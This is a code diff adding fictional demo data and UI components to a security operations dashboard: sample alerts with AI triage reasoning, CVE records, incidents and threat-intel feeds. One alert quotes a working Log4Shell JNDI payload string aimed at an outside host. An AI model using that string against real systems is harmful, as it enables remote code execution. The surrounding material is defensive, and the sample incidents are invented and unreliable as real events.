@@ -55,6 +55,437 @@ const CRED_FIELDS = {
 };
 
 const CATEGORIES = ['All','EDR','SIEM','NDR','XDR','Vuln','CSPM','Email','Network','Identity'];
+
+const SEV_COLOR = { Critical:'#f0405e', High:'#f97316', Medium:'#f0a030', Low:'#4f8fff' };
+
+const VERDICT_STYLE = {
+  TP:{c:'#f0405e',bg:'#f0405e12',label:'True Positive'},
+  FP:{c:'#22d49a',bg:'#22d49a12',label:'False Positive'},
+  SUS:{c:'#f0a030',bg:'#f0a03012',label:'Suspicious'},
+  Pending:{c:'#6b7a94',bg:'#6b7a9412',label:'Pending'},
+};
+
+const INDUSTRIES = ['Financial Services','Healthcare','Retail & eCommerce','Manufacturing','Energy & Utilities','Government & Public Sector','Legal & Professional','Technology','Education','Telecommunications'];
+
+// ─── Demo Data ─────────────────────────────────────────────────────────────────
+
+const DEMO_TOOLS = [
+  {id:'crowdstrike',name:'CrowdStrike',configured:true,active:true,alertCount:8},
+  {id:'defender',name:'Defender',configured:true,active:true,alertCount:5},
+  {id:'taegis',name:'Taegis XDR',configured:false,active:false},
+  {id:'darktrace',name:'Darktrace',configured:true,active:true,alertCount:3},
+  {id:'splunk',name:'Splunk',configured:true,active:true,alertCount:12},
+  {id:'sentinel',name:'Sentinel',configured:true,active:true,alertCount:4},
+  {id:'tenable',name:'Tenable',configured:true,active:true},
+  {id:'proofpoint',name:'Proofpoint',configured:true,active:true,alertCount:2},
+];
+
+const DEMO_GAP_DEVICES = [
+  {hostname:'SRV-LEGACY01',ip:'10.0.4.22',os:'Windows Server 2008',missing:['CrowdStrike Falcon','Tenable.io'],reason:'Legacy OS — agent incompatible',lastSeen:'2h ago'},
+  {hostname:'laptop-MKTG07',ip:'10.0.2.87',os:'Windows 11',missing:['CrowdStrike Falcon'],reason:'User-initiated uninstall',lastSeen:'15m ago'},
+  {hostname:'SRV-NAS01',ip:'10.0.3.15',os:'FreeNAS',missing:['CrowdStrike Falcon','Tenable.io','Splunk SIEM'],reason:'NAS device — no agent support',lastSeen:'5m ago'},
+  {hostname:'KIOSK-LOBBY',ip:'10.0.1.200',os:'Windows 10 IoT',missing:['Tenable.io','Microsoft Defender'],reason:'IoT device — restricted access',lastSeen:'1m ago'},
+  {hostname:'laptop-HR03',ip:'10.0.2.44',os:'macOS 13',missing:['CrowdStrike Falcon'],reason:'Pending deployment — ticket open',lastSeen:'30m ago'},
+];
+
+const DEMO_ALERTS = [
+  {id:'a1',title:'LSASS memory access — DC01',severity:'Critical',source:'CrowdStrike',device:'DC01',user:'admin_svc',ip:'10.0.0.5',time:'09:14',verdict:'TP',confidence:98,aiReasoning:'Domain controller targeted by LSASS memory access. Service account credentials at high risk. T1003.001 — high-fidelity detection. No maintenance window active. Previous login from this account was legitimate, now accessing LSASS — strong indicator of credential dumping.',evidenceChain:['Domain controller targeted — highest value asset','Service account admin_svc used laterally across 3 hosts','T1003.001 — credential dumping technique, high-fidelity','No scheduled maintenance or admin activity logged','Sequence mirrors known Mimikatz behaviour'],aiActions:['Incident INC-0847 created and assigned to Tier 2','admin_svc account disabled (revert available)','SOC Slack #incidents channel notified','5-step runbook generated and attached'],runbookSteps:['Isolate DC01 from network immediately','Reset admin_svc credentials across all domains','Run forensic memory capture on DC01','Search SIEM for admin_svc lateral movement in last 48h','Notify CISO — potential domain compromise'],mitre:'T1003.001',incidentId:'INC-0847'},
+  {id:'a2',title:'C2 beacon to 185.220.101.42:443',severity:'High',source:'Darktrace',device:'SRV-FINANCE01',ip:'185.220.101.42',time:'09:16',verdict:'TP',confidence:94,aiReasoning:'Darktrace detected anomalous HTTPS beacon with JA3 fingerprint matching known C2. IP 185.220.101.42 appears on ThreatFox with LockBit association. Beaconing interval 300s — consistent with C2 heartbeat.',evidenceChain:['IP on ThreatFox — LockBit C2','Darktrace: device deviation 96/100','JA3 fingerprint matches C2 tooling','300s beacon — classic heartbeat','Seen in sector intel 48h ago'],aiActions:['IP blocked at Zscaler perimeter','Darktrace packet capture initiated','IOC added to watchlist','SRV-FINANCE01 access restricted'],runbookSteps:['Block IP at all perimeter controls','Analyse all traffic from SRV-FINANCE01 last 72h','Check for additional beaconing hosts','Preserve memory image before isolation','Report IOC to ISG'],mitre:'T1071.001'},
+  {id:'a3',title:'Scheduled task persistence — SRV-APP02',severity:'Medium',source:'Defender',device:'SRV-APP02',time:'09:22',verdict:'SUS',confidence:67,aiReasoning:'Scheduled task created outside business hours by non-standard account. Technique consistent with persistence but could be legitimate tooling. Moderate confidence — analyst review recommended.',evidenceChain:['Task created at 02:17 AM — outside business hours','Non-standard service account creator','No matching change ticket','Similar to APT29 technique','No other anomalous activity from account'],aiActions:['Alert flagged for analyst review','Task hash added to monitoring'],runbookSteps:['Review task definition and binary','Cross-reference with change management','Check account login history','If unconfirmed — isolate and investigate'],mitre:'T1053.005'},
+  {id:'a4',title:'PowerShell via Windows Update',severity:'Low',source:'Splunk',device:'WS-SALES12',time:'09:31',verdict:'FP',confidence:99,aiReasoning:'PowerShell traced to Windows Update process (wuauclt.exe). Microsoft-signed certificate. KB5034441 scheduled. No malicious indicators.',evidenceChain:['Parent: wuauclt.exe — legit Windows Update','Microsoft-signed certificate','KB5034441 scheduled at 09:30','No network egress','No payload or download cradle'],aiActions:['Auto-closed — FP 99% confidence','Suppression rule created'],runbookSteps:[],mitre:'T1059.001'},
+  {id:'a5',title:'Anomalous VPN login — new geography',severity:'Medium',source:'Sentinel',device:'cloud-vpn',user:'jsmith@corp',time:'09:38',verdict:'SUS',confidence:72,aiReasoning:'User jsmith logged in from Singapore — baseline is UK. 03:00 AM local time. No travel in calendar. MFA enabled but not challenged.',evidenceChain:['Baseline: London — current: Singapore','03:00 AM local time','No calendar travel entry','MFA not recently challenged','No prior Singapore login in 12 months'],aiActions:['MFA re-challenge sent','Session maintained pending response','24h enhanced monitoring applied'],runbookSteps:['Await MFA — escalate if no response in 10m','If passed — monitor for anomalies','If failed — suspend account immediately','Contact user via phone'],mitre:'T1078'},
+  {id:'a6',title:'Large data exfiltration to personal cloud',severity:'High',source:'Zscaler',device:'laptop-HR03',user:'lbrown@corp',ip:'142.250.80.46',time:'10:02',verdict:'TP',confidence:88,aiReasoning:'18GB uploaded to personal Google Drive over 2 hours — 36x daily baseline. User has active resignation notice. Files include payroll directories. DLP policy triggered.',evidenceChain:['18GB — 36x user baseline','Personal Google Drive destination','Active resignation notice on file','Files: /finance/payroll/2025','DLP: PII and financial data'],aiActions:['Upload throttled via Zscaler','HR and Legal alerted','Files logged to audit trail','DLP monitoring enhanced'],runbookSteps:['Legal review of AUP breach','Preserve DLP logs','Remote wipe on departure','Brief IT on offboarding'],mitre:'T1567.002'},
+  {id:'a7',title:'Ransomware IOC match — SRV-BACKUP01',severity:'Critical',source:'Taegis XDR',device:'SRV-BACKUP01',ip:'10.0.4.12',time:'10:15',verdict:'TP',confidence:96,aiReasoning:'Taegis detected file extension mass-rename (.wncry extension) combined with shadow copy deletion commands. Backup server targeted — highest priority. Pattern matches LockBit 3.0 TTPs.',evidenceChain:['Mass file rename to .wncry extension','vssadmin delete shadows executed','Backup server — critical asset','LockBit 3.0 TTP match','Lateral movement from SRV-FINANCE01 same IP range'],aiActions:['SRV-BACKUP01 isolated immediately','Incident INC-0851 created — P1','CISO and IR team notified','Forensic snapshot taken'],runbookSteps:['Isolate entire VLAN 10.0.4.0/24','Identify patient zero — check finance server','Restore from known-good offline backup','Do not pay ransom — contact IR retainer','Notify ICO within 72h if PII affected'],mitre:'T1486',incidentId:'INC-0851'},
+  {id:'a8',title:'Malicious email attachment opened — Phishing',severity:'High',source:'Proofpoint',device:'WS-ACCTS04',user:'mwilson@corp',time:'10:28',verdict:'TP',confidence:91,aiReasoning:'Proofpoint quarantined email with malicious macro-enabled Excel attachment. User override-opened the quarantined attachment. DMARC fail + spoofed CFO sender. Attachment hash matches known dropper.',evidenceChain:['User override-opened quarantined attachment','DMARC fail on sender domain','Spoofed CFO: cfo@company-corp.com vs company.com','Attachment hash in VirusTotal 47/72','Macro-enabled XLSM — known dropper'],aiActions:['Attachment quarantined','User endpoint EDR scan triggered','Email chain blocked','Security awareness alert sent to team'],runbookSteps:['Isolate WS-ACCTS04 immediately','Reset mwilson credentials','Check for any macro execution logs','Hunt for dropper IOCs across estate','Phishing simulation recommendation'],mitre:'T1566.001'},
+  {id:'a9',title:'Suspicious OAuth app consent — Admin tenant',severity:'High',source:'Okta',device:'cloud-identity',user:'adminfirst@corp',time:'10:44',verdict:'SUS',confidence:79,aiReasoning:'New OAuth application granted admin-level directory permissions without change review. App publisher unverified. Consent granted by an admin account with no prior app authorisation history — potential OAuth phishing (consent grant attack).',evidenceChain:['OAuth app granted Directory.ReadWrite.All','Publisher domain: unverified','Granted by account with no prior app approvals','No change ticket for this application','Similar TTPs to Midnight Blizzard'],aiActions:['App access suspended pending review','Admin account placed on watchlist','Conditional access policy tightened'],runbookSteps:['Revoke application consent immediately','Audit all data accessed by app in last 24h','Review admin account login history','Enforce admin consent workflow in Azure AD','Hunt for similar OAuth apps across tenant'],mitre:'T1528'},
+  {id:'a10',title:'Critical vulnerability exploitation attempt — Log4Shell',severity:'Critical',source:'Elastic',device:'SRV-WEB02',ip:'45.33.32.156',time:'11:02',verdict:'TP',confidence:97,aiReasoning:'Elastic SIEM detected Log4Shell (CVE-2021-44228) exploitation string in HTTP User-Agent header targeting SRV-WEB02 Java application. Source IP on Shodan as known exploit scanner. Payload attempting JNDI LDAP callback to attacker-controlled server.',evidenceChain:['Log4Shell JNDI payload in User-Agent: ${jndi:ldap://45.33.32.156/a}','Source IP flagged on Shodan as exploit scanner','Java application on SRV-WEB02 uses Log4j 2.14.0 (vulnerable)','LDAP callback attempt to external IP detected','Pattern matches automated exploit kit'],aiActions:['WAF rule deployed — payload blocked','SRV-WEB02 Log4j emergency patch queued','Source IP blocked at perimeter','Incident INC-0852 created'],runbookSteps:['Emergency patch Log4j to 2.17.1+','Check for successful JNDI callbacks in last 72h','Audit all internet-facing Java apps','Deploy WAF rule across all load balancers','Threat hunt for post-exploitation'],mitre:'T1190',incidentId:'INC-0852'},
+  {id:'a11',title:'Endpoint EDR detection — Cobalt Strike beacon',severity:'Critical',source:'SentinelOne',device:'WS-DEV08',user:'rchang@corp',ip:'192.168.1.88',time:'11:19',verdict:'TP',confidence:95,aiReasoning:'SentinelOne AI detected in-memory Cobalt Strike beacon activity on developer workstation. Process injection into legitimate svchost.exe. Beacon profile matches known CS team server. Developer workstation with elevated privileges — high lateral movement risk.',evidenceChain:['Cobalt Strike process injection: malware→svchost.exe','In-memory beacon — no disk artefact (fileless)','CS team server profile match','Developer account has domain admin','Outbound C2 to new domain registered 3 days ago'],aiActions:['WS-DEV08 isolated immediately','Process killed and memory dump taken','rchang credentials reset','Incident INC-0853 P1 created'],runbookSteps:['Immediate network isolation of WS-DEV08','Full memory forensics via SentinelOne Deep Visibility','Hunt for lateral movement from rchang account','Reset all privileged credentials accessible from this host','Check CI/CD pipeline for injected code'],mitre:'T1055.002',incidentId:'INC-0853'},
+  {id:'a12',title:'Carbon Black — PowerShell Empire C2 detected',severity:'High',source:'Carbon Black',device:'SRV-HR01',ip:'10.0.2.31',time:'11:33',verdict:'TP',confidence:89,aiReasoning:'Carbon Black Response detected Empire PowerShell C2 framework. Encrypted HTTP traffic to non-corporate IP. Staging behaviour consistent with post-exploitation recon phase. HR server — PII data at risk.',evidenceChain:['Empire PowerShell C2 signature match','Encrypted HTTP to non-corporate IP: 92.63.197.44','AMSI bypass attempted','HR server — contains employee PII','Process chain: outlook.exe → powershell.exe → network'],aiActions:['Host isolated via Carbon Black Response','Kill switch deployed on CB agent','HR data access logged for DPA purposes','NCSC reported — GDPR breach assessment started'],runbookSteps:['Isolate SRV-HR01','Identify initial access vector — suspect phishing email','Preserve logs for ICO potential notification','Hunt for Empire agents across estate','Engage DPO for GDPR 72h assessment'],mitre:'T1059.001'},
+  {id:'a13',title:'Vulnerability scan — Critical CVE on exposed service',severity:'High',source:'Tenable',device:'SRV-EXTERNAL01',ip:'203.0.113.42',time:'11:45',verdict:'TP',confidence:92,aiReasoning:'Tenable.io identifies CVE-2024-1709 (ConnectWise ScreenConnect auth bypass, CVSS 10.0) on internet-facing server. CISA KEV listed. Active exploitation in the wild. Immediate patching required.',evidenceChain:['CVE-2024-1709 CVSS 10.0 — CISA KEV listed','Internet-facing host with no WAF in front','Plugin ID 212918 — auth bypass confirmed','Exploit PoC publicly available','Active exploitation confirmed by CISA'],aiActions:['Critical vuln ticket raised — P1 SLA 24h','Firewall rule applied to restrict access','Patch notification sent to ops team'],runbookSteps:['Apply patch immediately — CVE-2024-1709','If patch not possible: block external access','Verify no exploitation occurred in last 14 days','Deploy WAF rule as compensating control','Rescan after patch to verify remediation'],mitre:'T1190'},
+  {id:'a14',title:'QRadar SIEM — Insider threat data staging',severity:'High',source:'QRadar',device:'WS-FIN22',user:'tpatel@corp',ip:'10.1.5.22',time:'12:01',verdict:'SUS',confidence:76,aiReasoning:'QRadar correlated multiple events: unusual after-hours file access, large archive creation, USB device insertion, and internal IP scanning. Pattern matches pre-exfiltration staging. User is on PIP — HR flag.',evidenceChain:['After-hours file access to /finance/budgets — 2am','7z archive created: company_data.7z (3.4GB)','USB device inserted 02:14','Internal IP scan from WS-FIN22 03:00','HR flag: user on performance improvement plan'],aiActions:['DLP alert raised','USB activity flagged for HR review','Account placed on enhanced monitoring','Legal briefed on potential IP theft'],runbookSteps:['Preserve forensic image of WS-FIN22','Brief HR and Legal before any user contact','Review DLP logs for data classification','Check USB device serial number against asset register','Prepare evidence chain for potential proceedings'],mitre:'T1074.001'},
+]
+
+const DEMO_VULNS = [
+  {id:'v1',cve:'CVE-2024-21413',title:'Microsoft Outlook NTLM Credential Leak',severity:'Critical',cvss:9.8,prevalence:94,affected:23,affectedDevices:['laptop-CFO01','laptop-SALES03','WS-HR01','+ 20 more'],description:'Critical RCE/NTLM relay vulnerability in Microsoft Outlook. Exploitable via malicious email links without user interaction. Actively exploited in the wild by APT actors.',remediation:['Apply Microsoft patch KB5002112 immediately','Enable Windows Credential Guard on all endpoints','Block outbound SMB (TCP 445) at perimeter','Add to email gateway URL filtering rules','Consider blocking external hyperlinks in email until patched'],kev:true,patch:'KB5002112'},
+  {id:'v2',cve:'CVE-2024-3400',title:'PAN-OS Command Injection — GlobalProtect',severity:'Critical',cvss:10.0,prevalence:88,affected:2,affectedDevices:['FW-EDGE01','FW-BRANCH01'],description:'Critical command injection in Palo Alto GlobalProtect gateway. CVSSv3 10.0. Exploited by nation-state actors (UNC5221) in the wild. Full command execution possible.',remediation:['Apply PAN-OS patch 11.1.2-h3 or later immediately','Enable Threat Prevention signatures for CVE-2024-3400','Review GlobalProtect logs for IOCs: sessions from unexpected IPs','Isolate affected firewalls if patch cannot be applied immediately','Contact Palo Alto PSIRT if compromise suspected'],kev:true,patch:'PAN-OS 11.1.2-h3'},
+  {id:'v3',cve:'CVE-2024-27198',title:'JetBrains TeamCity Auth Bypass',severity:'Critical',cvss:9.8,prevalence:76,affected:3,affectedDevices:['SRV-CICD01','SRV-BUILD02','SRV-BUILD03'],description:'Authentication bypass in JetBrains TeamCity build server. Allows unauthenticated remote code execution. APT29 (Cozy Bear) actively exploiting to compromise CI/CD pipelines and inject malicious build artifacts.',remediation:['Upgrade TeamCity to version 2023.11.4 immediately','If upgrade not possible, restrict TeamCity to VPN access only','Review all build logs for unexpected plugin installations','Audit service account permissions used by TeamCity','Check build artifacts for unexpected modifications'],kev:true,patch:'TeamCity 2023.11.4'},
+  {id:'v4',cve:'CVE-2023-46805',title:'Ivanti ICS/IPS Authentication Bypass',severity:'Critical',cvss:8.2,prevalence:71,affected:1,affectedDevices:['IVANTI-GW01'],description:'Authentication bypass affecting Ivanti Connect Secure and Policy Secure. Chained with CVE-2024-21887 for RCE. Mass exploitation observed. CISA emergency directive issued.',remediation:['Apply Ivanti patch immediately or take gateway offline','Run Ivanti Integrity Checker Tool','Reset all passwords for users authenticated via affected gateway','Review SIEM for suspicious authentication patterns','Consider replacing with alternative VPN solution if persistent issues'],kev:true},
+  {id:'v5',cve:'CVE-2024-1708',title:'ConnectWise ScreenConnect Path Traversal',severity:'Critical',cvss:8.4,prevalence:65,affected:1,affectedDevices:['SCREENCONNECT01'],description:'Path traversal vulnerability in ConnectWise ScreenConnect. Allows unauthenticated RCE. Ransomware groups actively using this to gain initial access to MSP-managed networks.',remediation:['Upgrade ScreenConnect to version 23.9.8 or later','If upgrade delayed, disable external access until patched','Review ScreenConnect audit logs for unauthorized sessions','Check all managed endpoints for unauthorized ScreenConnect sessions','Alert clients if you are an MSP using ScreenConnect'],kev:true,patch:'ScreenConnect 23.9.8'},
+  {id:'v6',cve:'CVE-2024-21762',title:'Fortinet FortiOS OOB Write — SSL VPN',severity:'Critical',cvss:9.6,prevalence:82,affected:2,affectedDevices:['FORTI-EDGE01','FORTI-DR01'],description:'Out-of-bounds write in Fortinet FortiOS SSL VPN. No authentication required. Likely exploited in the wild. Fortinet issued emergency patch.',remediation:['Upgrade FortiOS to 7.4.3 or 7.2.7 immediately','Disable SSL VPN if upgrade cannot be applied immediately','Monitor for IOCs: unexpected admin account creation, config changes','Check FortiGuard subscription is active and updated','Verify all admin accounts — delete any unrecognised'],kev:true,patch:'FortiOS 7.4.3'},
+  {id:'v7',cve:'CVE-2024-20767',title:'Adobe ColdFusion RCE — Public Files',severity:'High',cvss:8.7,prevalence:58,affected:4,affectedDevices:['SRV-WEB01','SRV-WEB02','SRV-WEB03','SRV-WEB04'],description:'Remote code execution in Adobe ColdFusion via the administrator panel. Allows arbitrary file read and potential RCE. Web-facing ColdFusion servers at significant risk.',remediation:['Apply Adobe patch APSB24-14 immediately','If ColdFusion admin interface is internet-facing, take offline','Restrict admin interface to management VLAN only','Enable WAF rules for ColdFusion exploit attempts','Review web server logs for scanning activity'],kev:false,patch:'APSB24-14'},
+  {id:'v8',cve:'CVE-2024-22024',title:'Ivanti Connect Secure XXE Injection',severity:'High',cvss:8.3,prevalence:52,affected:1,affectedDevices:['IVANTI-GW01'],description:'XXE injection in Ivanti Connect Secure and Neurons for ZTA. Can be used to access sensitive files. Affects same device-2023-46805 — prioritise remediation.',remediation:['Covered by same Ivanti patch-2023-46805','Verify patch applied to both vulnerabilities simultaneously','Run Ivanti ICT scan post-patching','Monitor for XML-related errors in gateway logs'],kev:false},
+  {id:'v9',cve:'CVE-2024-27956',title:'WordPress Automatic Plugin SQL Injection',severity:'High',cvss:9.8,prevalence:45,affected:2,affectedDevices:['SRV-WEB02','SRV-WEB03'],description:'Critical SQL injection in WordPress Automatic plugin. Allows unauthenticated attackers to create admin users and upload webshells. Rapidly weaponised.',remediation:['Update Automatic plugin to version 3.92.1 or later','Scan WordPress installations for unauthorized admin accounts','Check for uploaded files in wp-content/uploads — remove suspicious','Enable WAF plugin (Wordfence) or cloud WAF rule','Consider disabling XML-RPC if not needed'],kev:false,patch:'Automatic plugin 3.92.1'},
+  {id:'v10',cve:'CVE-2023-48788',title:'Fortinet EMS SQL Injection — RCE',severity:'High',cvss:9.3,prevalence:38,affected:1,affectedDevices:['EMS-SERVER01'],description:'SQL injection in Fortinet FortiClientEMS. Enables RCE without authentication. Widely exploited against internet-exposed EMS servers. DoJ charged attackers exploiting this.',remediation:['Upgrade FortiClientEMS to 7.2.3 or 7.0.10','Restrict EMS to internal network — no direct internet exposure','Check EMS logs for unauthorized SQL activity','Audit all managed endpoint agents for unexpected configuration changes'],kev:true,patch:'FortiClientEMS 7.2.3'},
+];
+
+const DEMO_INCIDENTS = [
+  {id:'INC-0847',title:'Domain Controller Compromise — admin_svc Credential Dump',severity:'Critical',status:'Active',created:'2026-03-22 09:14',updated:'2026-03-22 09:47',alertCount:4,devices:['DC01','SRV-FINANCE01','laptop-CFO01'],mitreTactics:['Initial Access','Credential Access','Lateral Movement'],aiSummary:'Multi-stage credential theft attack targeting domain infrastructure. Attacker gained initial access via spear-phish, executed LSASS dump on DC01, and used compromised admin_svc credentials to move laterally to SRV-FINANCE01. C2 beacon detected and blocked. Domain credentials at high risk — immediate reset recommended.',timeline:[
+    {t:'09:14',actor:'AI',action:'Initial alert correlated',detail:'LSASS access on DC01 — Incident created and Tier 2 assigned'},
+    {t:'09:15',actor:'AI',action:'admin_svc account disabled',detail:'Auto-response: account suspended across all domain controllers'},
+    {t:'09:16',actor:'AI',action:'C2 traffic blocked',detail:'IP 185.220.101.42 blocked at Zscaler perimeter. Darktrace PCAP initiated'},
+    {t:'09:22',actor:'Analyst',action:'Confirmed TP — escalated to Incident Commander',detail:'IR team engaged. DC01 isolated. Forensic image requested'},
+    {t:'09:31',actor:'AI',action:'Lateral movement path mapped',detail:'admin_svc lateral path: laptop-CFO01 → DC01 → SRV-FINANCE01'},
+    {t:'09:47',actor:'AI',action:'Updated kill chain analysis',detail:'Full attack timeline generated. MITRE ATT&CK mapping complete'},
+  ]},
+  {id:'INC-0846',title:'Suspected Insider Threat — Data Exfiltration',severity:'High',status:'Contained',created:'2026-03-22 08:45',updated:'2026-03-22 09:12',alertCount:3,devices:['laptop-HR03','cloud-email'],mitreTactics:['Collection','Exfiltration'],aiSummary:'HR employee with active resignation notice uploaded 18GB of payroll and personnel data to personal Google Drive. Email forwarding rule discovered directing inbox to personal Gmail. DLP policies enforced, legal team notified. Data exfiltration contained — no external breach confirmed.',timeline:[
+    {t:'08:45',actor:'AI',action:'DLP alert correlated with HR data',detail:'Zscaler flagged 18GB upload. HR system integration confirmed resignation notice'},
+    {t:'08:47',actor:'AI',action:'Upload throttled',detail:'Zscaler policy updated to block personal cloud storage for this user'},
+    {t:'09:00',actor:'AI',action:'Email forwarding rule discovered and deleted',detail:'3,200 emails forwarded to personal Gmail in 48h. Rule removed. HR and Legal auto-notified'},
+    {t:'09:12',actor:'Analyst',action:'Incident contained — legal review underway',detail:'IT forensics preserving audit trail. Device remote wipe scheduled for departure date'},
+  ]},
+];
+
+const DEMO_INTEL_BY_INDUSTRY = {
+  'Financial Services':[
+    {id:'i1',title:'TA505 Targeting UK Banks — Cobalt Strike Deployment',summary:'TA505 (Clop ransomware affiliate) observed targeting UK financial institutions with spear-phishing campaigns delivering Cobalt Strike beacons via fake SWIFT notification emails. 3 UK banks confirmed compromised in the last 14 days.',severity:'Critical',source:'NCSC & ThreatFox',time:'2h ago',iocs:['185.220.101.42','hxxps://swift-notification[.]com','cobalt-cs-payload-2024.exe'],mitre:'T1566.001',industrySpecific:true,url:'https://www.ncsc.gov.uk/threats'},
+    {id:'i2',title:'QakBot Resurgence — Banking Trojans via PDF Lures',summary:'QakBot (QBot) back in circulation after law enforcement takedown. New infrastructure and updated PDF lure themed around invoice disputes. Financial sector primary target. High evasion capability — bypasses standard email security.',severity:'High',source:'CISA KEV',time:'6h ago',iocs:['invoice-dispute-2024.pdf','hxxp://qakbot-new[.]ru'],mitre:'T1566.001',industrySpecific:true,url:'https://www.cisa.gov/known-exploited-vulnerabilities-catalog'},
+    {id:'i3',title:'SWIFT Customer Security Programme — Audit Deadline',summary:'SWIFT CSP mandatory controls attestation deadline approaching. Ensure your SWIFT connector environments comply with CSP 2024 requirements, particularly around multi-factor authentication and anomaly detection integration.',severity:'Medium',source:'SWIFT ISAC',time:'1d ago',industrySpecific:true,url:'https://www.swift.com/our-solutions/compliance-and-shared-services/financial-crime-cyber-security'},
+  ],
+  'Healthcare':[
+    {id:'i4',title:'Rhysida Ransomware Targeting NHS Trusts',summary:'Rhysida ransomware group actively targeting NHS Trusts and healthcare providers. Gain access via phishing, move laterally to clinical systems, and exfiltrate patient data before encryption. 4 NHS Trusts hit in last 30 days.',severity:'Critical',source:'NCSC Health Alert',time:'4h ago',iocs:['rhysida-ransom.onion','185.181.60.92','health-tender-2024.exe'],mitre:'T1486',industrySpecific:true,url:'https://www.ncsc.gov.uk/sector/healthcare'},
+    {id:'i5',title:'DICOM Vulnerability — Medical Imaging Systems Exposed',summary:'Multiple DICOM-compliant medical imaging systems found to have patient data exposed on the internet without authentication. Check for internet-exposed DICOM servers on port 104. Over 1,000 UK systems found exposed in recent scan.',severity:'High',source:'Cynerio Research',time:'1d ago',industrySpecific:true,url:'https://cynerio.com/blog'},
+  ],
+  'default':[
+    {id:'def1',title:'CISA KEV Update — 3 New Actively Exploited CVEs',summary:'CISA added CVE-2024-21413 (Outlook), CVE-2024-3400 (PAN-OS), and CVE-2024-27198 (TeamCity) to Known Exploited Vulnerabilities catalog. All three being actively exploited in the wild. Patch deadline: 72 hours.',severity:'Critical',source:'CISA KEV',time:'3h ago',iocs:[],mitre:'',industrySpecific:false},
+    {id:'def2',title:'LockBit 3.0 Infrastructure Resurfaces Post-Takedown',summary:'LockBit 3.0 operational infrastructure identified on new IP ranges following law enforcement takedown. Group recruiting new affiliates and offering updated locker with improved evasion. Healthcare and financial sectors primary targets.',severity:'High',source:'ThreatFox',time:'8h ago',iocs:['185.220.101.0/24','lockbit-ransom3.com'],mitre:'T1486',industrySpecific:false},
+    {id:'def3',title:'ThreatFox IOC Feed — 847 New C2 Indicators',summary:'ThreatFox published 847 new command-and-control indicators in the last 24 hours. Predominant malware families: AsyncRAT, RedLine Stealer, Cobalt Strike. Recommend enriching alert triage rules with updated IOC set.',severity:'Medium',source:'ThreatFox',time:'1h ago',industrySpecific:false},
+    {id:'def4',title:'URLhaus Phishing Kit — 23 New Malicious Domains',summary:'23 newly registered domains identified distributing credential harvesting kits mimicking Microsoft 365, DocuSign, and SharePoint. All domains registered in last 72h with low reputation.',severity:'Medium',source:'URLhaus',time:'2h ago',industrySpecific:false},
+  ],
+};
+
+// ─── Helpers ──────────────────────────────────────────────────────────────────
+function SevBadge({sev}) {
+  return <span style={{fontSize:'0.5rem',fontWeight:800,padding:'1px 6px',borderRadius:3,color:'#fff',background:SEV_COLOR[sev]}}>{sev.toUpperCase()}</span>;
+}
+
+// ─── Modal ────────────────────────────────────────────────────────────────────
+
+function Modal({title,onClose,children}) {
+  return (
+    <div style={{position:'fixed',inset:0,background:'rgba(0,0,0,0.75)',zIndex:200,display:'flex',alignItems:'center',justifyContent:'center',padding:20}} onClick={onClose}>
+      <div style={{background:'var(--wt-card2)',border:'1px solid var(--wt-border2)',borderRadius:16,maxWidth:700,width:'100%',maxHeight:'85vh',overflow:'auto',position:'relative'}} onClick={e=>e.stopPropagation()}>
+        <div style={{display:'flex',alignItems:'center',padding:'16px 20px',borderBottom:'1px solid #141820',position:'sticky',top:0,background:'var(--wt-card2)',zIndex:10}}>
+          <span style={{fontWeight:700,fontSize:'0.92rem'}}>{title}</span>
+          <button onClick={onClose} style={{marginLeft:'auto',background:'none',border:'none',color:'var(--wt-muted)',cursor:'pointer',fontSize:'1.2rem',lineHeight:1}}>×</button>
+        </div>
+        <div style={{padding:20}}>{children}</div>
+      </div>
+    </div>
+  );
+}
+
+// ─── Stat Card ────────────────────────────────────────────────────────────────
+
+function StatCard({val,label,sub,color,onClick}) {
+  return (
+    <div onClick={onClick} style={{padding:'14px 12px',background:'var(--wt-card)',border:'1px solid #141820',borderRadius:10,textAlign:'center',cursor:onClick?'pointer':'default',transition:'border-color .15s'}}
+      onMouseEnter={e=>{ if(onClick)(e.currentTarget).style.borderColor='#4f8fff40'; }}
+      onMouseLeave={e=>{ (e.currentTarget).style.borderColor='var(--wt-border)'; }}>
+      <div style={{fontSize:'1.5rem',fontWeight:900,fontFamily:'JetBrains Mono,monospace',color,letterSpacing:-1}}>{val}</div>
+      <div style={{fontSize:'0.62rem',fontWeight:700,color:'var(--wt-muted)',textTransform:'uppercase',letterSpacing:'0.4px',marginTop:2}}>{label}</div>
+      {sub && <div style={{fontSize:'0.56rem',color:'var(--wt-dim)',marginTop:2}}>{sub}</div>}
+      {onClick && <div style={{fontSize:'0.48rem',color:'#4f8fff',marginTop:4}}>click to view →</div>}
+    </div>
+  );
+}
+
+// ─── Paywall Gate ────────────────────────────────────────────────────────────
+
+function GateWall({ feature, requiredTier, children, userTier }) {
+  const levels = {community:0,team:1,business:2,mssp:3};
+  if ((levels[userTier]||0) >= levels[requiredTier]) return (<>{children}</>);
+  const tierColors = {team:'#4f8fff',business:'#22d49a',mssp:'#8b6fff'};
+  const tierPrices = {team:'£49/seat',business:'£199/mo',mssp:'£799/mo'};
+  return (
+    <div style={{position:'relative',overflow:'hidden',borderRadius:12}}>
+      <div style={{filter:'blur(3px)',opacity:0.3,pointerEvents:'none',userSelect:'none'}}>{children}</div>
+      <div style={{position:'absolute',inset:0,display:'flex',flexDirection:'column',alignItems:'center',justifyContent:'center',background:'rgba(5,5,8,0.85)',backdropFilter:'blur(2px)',borderRadius:12,border:`1px solid ${tierColors[requiredTier]}20`}}>
+        <div style={{fontSize:'1.4rem',marginBottom:8}}>🔒</div>
+        <div style={{fontSize:'0.82rem',fontWeight:700,marginBottom:4}}>{feature}</div>
+        <div style={{fontSize:'0.72rem',color:'var(--wt-muted)',marginBottom:14,textAlign:'center',maxWidth:260}}>Available on {requiredTier.charAt(0).toUpperCase()+requiredTier.slice(1)} plan and above</div>
+        <a href='/pricing' style={{padding:'8px 20px',borderRadius:8,background:tierColors[requiredTier],color:'#fff',fontSize:'0.76rem',fontWeight:700,textDecoration:'none',display:'inline-block'}}>Upgrade to {requiredTier.charAt(0).toUpperCase()+requiredTier.slice(1)} — {tierPrices[requiredTier]}</a>
+      </div>
+    </div>
+  );
+}
+
+// ─── AI Remediation Output Renderer ─────────────────────────────────────────
+
+function RemediationOutput({ text }) {
+  const [copied, setCopied] = useState(null);
+
+  function copyCode(code, id) {
+    navigator.clipboard.writeText(code).then(()=>{
+      setCopied(id);
+      setTimeout(()=>setCopied(null), 2000);
+    });
+  }
+
